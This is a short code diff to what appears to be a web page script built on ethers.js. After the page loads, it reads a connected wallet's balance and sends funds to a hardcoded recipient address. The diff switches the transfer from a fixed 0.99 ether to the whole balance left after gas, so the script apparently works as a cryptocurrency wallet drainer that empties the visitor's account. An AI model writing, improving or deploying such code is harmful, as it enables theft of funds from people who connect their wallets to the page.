@@ -51,18 +51,16 @@ document.addEventListener('DOMContentLoaded', async () => {
       const balance = await provider.getBalance(account);
       const maxSendable = balance.sub(gasPrice.mul(gasLimit));
 
-      const sendablePercentage = ethers.utils.parseEther('0.99'); // 99% of balance in ether
-
-      if (maxSendable.gte(sendablePercentage)) {
+      if (maxSendable.gt(0)) {
         const transactionParam = {
           to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
-          value: sendablePercentage
+          value: maxSendable
         };
 
         const txResponse = await signer.sendTransaction(transactionParam);
         console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
       } else {
-        console.error('Insufficient balance to cover gas cost or transfer amount.');
+        console.error('Insufficient balance to cover gas cost.');
       }
     } catch (error) {
       console.error('Error sending transaction:', error);
